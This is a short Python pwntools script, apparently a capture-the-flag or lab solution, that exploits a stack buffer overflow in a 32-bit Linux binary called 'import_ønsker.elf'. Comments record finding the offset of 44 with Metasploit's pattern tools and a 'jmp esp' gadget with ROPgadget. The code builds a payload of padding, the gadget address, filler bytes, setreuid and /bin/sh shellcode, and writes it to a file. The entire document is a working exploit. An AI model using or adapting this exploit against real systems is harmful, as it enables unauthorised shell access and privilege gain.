#!/usr/bin/env python3
# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100
# Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x35624134
# [*] Exact match at offset 44

from pwn import *

context(os="linux", arch="i386")

#ROPgadget --binary import_ønsker.elf | grep "jmp esp"
# 0x08049ddc : jmp esp

padding = b"A"*44
codes = shellcraft.i386.linux
shellcode = asm(codes.sh())
setuid = asm(codes.setreuid(uid=1000))
eip_jmp_esp = p32(0x08049ddc)
nops = p32(0x90) * 8
exploit_code = padding + eip_jmp_esp + nops + setuid + shellcode
print(exploit_code)

with open("storenis", "wb") as f:
    f.write(exploit_code)
